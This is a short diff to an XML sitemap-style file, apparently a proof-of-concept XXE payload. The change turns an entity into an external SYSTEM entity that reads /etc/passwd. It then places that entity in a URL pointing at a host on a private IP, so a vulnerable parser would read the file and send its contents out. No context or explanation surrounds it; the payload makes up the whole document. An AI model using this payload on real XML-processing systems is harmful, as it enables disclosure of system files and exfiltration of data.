@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE urlset [
- <!ENTITY xxe "file:///etc/hostname">
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
     <url>
         <loc>http://192.168.0.19:8000/?data=&xxe;</loc>
